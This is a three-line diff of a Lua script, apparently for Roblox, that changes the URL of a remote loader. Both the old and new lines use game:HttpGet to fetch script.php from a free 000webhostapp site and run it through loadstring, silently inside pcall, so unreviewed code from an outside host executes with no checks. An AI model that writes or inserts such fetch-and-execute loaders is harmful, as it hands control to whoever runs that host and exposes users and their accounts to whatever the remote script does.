@@ -1,3 +1,3 @@
 pcall(function()
-    loadstring(game:HttpGet("https://ehubdutfun.000webhostapp.com/script.php"))()
+    loadstring(game:HttpGet("https://ehubdotfunsite.000webhostapp.com/data/script.php"))()
 end)
